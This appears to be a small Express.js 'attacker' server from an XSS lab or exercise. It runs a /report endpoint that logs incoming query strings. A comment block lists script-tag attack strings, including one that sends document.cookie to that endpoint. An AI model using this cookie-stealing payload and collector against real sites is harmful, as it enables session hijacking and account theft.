const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const logger = require('morgan');
const config = require('./config');


/**
 * @attackstring <script> console.log("pwnd") </script> GOOD
 * @attackstring <script> $.post('/report', function()) </script>
 * @attackstring <script> $.get('http://localhost:8001/report?cookies=' + document.cookie); </script> ALMOST GOOD
 * @attackstring <script> console.log(document.cookie) </script> GOOD
 * @attackstring <script> console.log("pwnd") </script>
 */


const app = express();
//app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: false}));
app.use(bodyParser.json());
app.use(logger('dev'));

//source the client facing html
app.get('/', function(req,res){
    res.send("Waiting for Exploits!");
});

app.get('/report', function (req,res) {
   console.log(req.query);
   res.send("hit");
});

app.listen(config.attacker_port, function() { console.log('Server running at http://localhost:8001')});